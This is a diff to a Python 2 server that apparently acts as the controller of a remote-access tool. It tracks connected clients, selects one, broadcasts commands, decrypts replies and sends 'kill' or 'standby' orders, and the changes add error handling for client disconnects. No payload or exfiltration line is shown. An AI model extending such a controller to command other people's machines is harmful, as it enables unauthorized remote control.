@@ -114,16 +114,6 @@ class Server(threading.Thread):
 
     def _error(self, data): print('\n' + colorama.Fore.RED + colorama.Style.BRIGHT + '[-] ' + self._text_color + self._text_style + data + '\n')
 
-    def _print(self, data):
-        if self.current_client:
-            self.current_client.lock.clear()
-            print('\n' + self._text_color + self._text_style + data)
-            self.current_client.lock.set()
-            return self.current_client.run()
-        else:
-            print('\n' + self._text_color + self._text_style + data)
-            return self.run()
-
     def _long_to_bytes(self, x):
         try:
             return bytes(bytearray.fromhex(hex(long(x)).strip('0x').strip('L')))
@@ -137,6 +127,19 @@ class Server(threading.Thread):
         except Exception as e:
             if '__v__' in vars(self) and self.__v__:
                 self._error("Bytes-to-long conversion error: {}".format(str(e)))
+
+    def _print(self, data):
+        if self.current_client:
+            self.current_client.lock.clear()
+            print('\n' + self._text_color + self._text_style + data + '\n')
+            try:
+                self.current_client.lock.set()
+                return self.current_client.run()
+            except Exception as e:
+                print('\nError - {}\n'.format(str(e)))
+        else:
+            print('\n' + self._text_color + self._text_style + data + '\n')
+        return self.run()
 
     def _settings(self, target, setting, option):
         target  = target.lower()
@@ -267,12 +270,26 @@ class Server(threading.Thread):
             buffer, method, message  = "", "", ""
             if client:
                 while "\n" not in buffer:
-                    buffer += client.conn.recv(4096)
+                    try:
+                        buffer += client.conn.recv(4096)
+                    except:
+                        client.lock.clear()
+                        self.current_client = None
+                        print('\n' + server._text_color + server._text_style + 'Client {} has disconnected'.format(client.name))
                 if len(buffer):
-                    method, _, message = buffer.partition(':')
-                    message = server.decrypt(message, client.name)
-            return method, message.rstrip()
-
+                    try:
+                        method, _, message = buffer.partition(':')
+                        message = server.decrypt(message, client.name)
+                        return method, message.rstrip()
+                    except: pass
+                if client.lock.is_set():
+                    try:
+                        return client.run()
+                    except:
+                        client.lock.clear()
+                        self.current_client = None
+        return server.run()
+    
     def get_clients(self):
         return [v for _, v in self.current_client.items()]
 
@@ -283,12 +300,16 @@ class Server(threading.Thread):
             self.current_client.lock.clear()
         if int(client_id) not in self.clients:
             self._error( "Invalid Client ID")
-            return self.run()
         else:
             self.current_client = self.clients[int(client_id)]
             self._print('\nClient {} selected\n'.format(client_id))
             self.current_client.lock.set()
-            return self.current_client.run()
+            try:
+                return self.current_client.run()
+            except Exception as e:
+                self._error(str(e))
+                self.current_client = None
+        return self.run()
 
     def deselect_client(self):
         if self.current_client and self.current_client.lock.is_set():
@@ -296,49 +317,37 @@ class Server(threading.Thread):
         self.current_client = None
         self.lock.set()
         return self.run()
-
       
     def sendall_clients(self, msg):
         for client in self.get_clients():
-            self.send_client(msg, client.name)
+            try:
+                self.send_client(msg, client.name)
+            except:
+                print(self._text_color + self._text_style + 'Unable to connect to client {}'.format(client.name))
 
-      
     def remove_client(self, key):
         return self.clients.pop(int(key), None)
-    
-      
+          
     def kill_client(self, client_id):
         client = self.clients.get(int(client_id))
         self.send_client('kill', client.name)
         client.conn.close()
         self.remove_client(client.name)
-    
       
     def list_clients(self):
         print(colorama.Fore.MAGENTA + colorama.Style.DIM + '\nID | Client Address\n-------------------')
         for k, v in self.clients.items():
             print(self._text_color + self._text_style + '{:>2}'.format(k) + colorama.Fore.MAGENTA + colorama.Style.DIM + ' | ' + self._text_color + self._text_style + v.addr[0])
         print
-
-    def usage(self):
-        print HELP_CMDS
           
     def quit_server(self):
-        print 'Exit the server and keep all clients alive (y/n)? ',
-        q = raw_input('')
-        if 'y' in q.lower():
-            try:
-                for client in self.get_clients():
-                    try:
-                        self.send_client('standby', client.name)
-                    except: pass
-            finally:
-                sys.exit(0)
-        else:
-            if self.current_client:
-                return self.current_client.run()
-            else:
-                return self.run()
+        try:
+            for client in self.get_clients():
+                try:
+                    self.send_client('standby', client.name)
+                except: pass
+        finally:
+            sys.exit(0)
     
     def settings(self, args):
         return self._settings(*args.split())
@@ -425,7 +434,14 @@ class Server(threading.Thread):
         print(self._text_color + self._text_style+ '< > = required argument')
         print(self._text_color + self._text_style+ '[ ] = optional argument\n')
         print
-        return self.current_client.run() if self.current_client else self.run()
+        if self.current_client:
+            try:
+                return self.current_client.run()
+            except Exception as e:
+                self.current_client.lock.clear()
+                self.current_client = None
+                print(self._text_color + self._text_style+ str(e))
+        return self.run()
 
     def run(self):
         while True:
@@ -479,7 +495,12 @@ class ConnectionHandler(threading.Thread):
             if exit_status:
                 break
             self.lock.wait()
-            method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
+            data = ''
+            try:
+                method, data = ('prompt', self.prompt) if self.prompt else server.recv_client(self.name)
+            except:
+                self.lock.clear()
+                server._print('Client {} disconnected'.format(client.name))
             if 'prompt' in method:
                 self.prompt = data.format(self.name)
                 command = server._prompt(self.prompt)
